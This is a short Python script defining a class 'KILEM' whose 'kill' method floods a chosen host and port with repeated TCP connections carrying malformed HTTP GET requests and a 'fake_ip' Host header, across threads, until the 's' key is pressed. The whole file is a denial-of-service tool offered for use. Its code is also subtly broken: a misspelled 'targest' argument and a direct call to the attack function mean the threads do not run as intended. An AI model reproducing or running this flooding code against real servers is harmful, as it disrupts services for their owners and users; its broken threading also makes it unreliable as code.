import keyboard
import threading
import socket


class KILEM:
    def kill(wtd, num_of_threads, fake_ip, port):

        def dos(wtd, port, fake_ip):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((wtd, port))
            sock.sendto(("GET /" + wtd + " HTTP/1.1\r\n").encode('ascii'), (wtd, port))
            sock.sendto(("HOST: " + fake_ip + " ").encode('ascii'), (wtd, port))    
            sock.close()
        
        def attack(wtd, port, fake_ip):
            already_con = 0
            while True:
                if keyboard.is_pressed('s'):
                    break
                else:
                    dos(wtd, port, fake_ip)
                    already_con +=1
                    print(already_con)

        for i in range(num_of_threads):
            if keyboard.is_pressed('s'):
                break
            else:
                thread = threading.Thread(targest=attack(wtd, port, fake_ip))
                thread.start()
#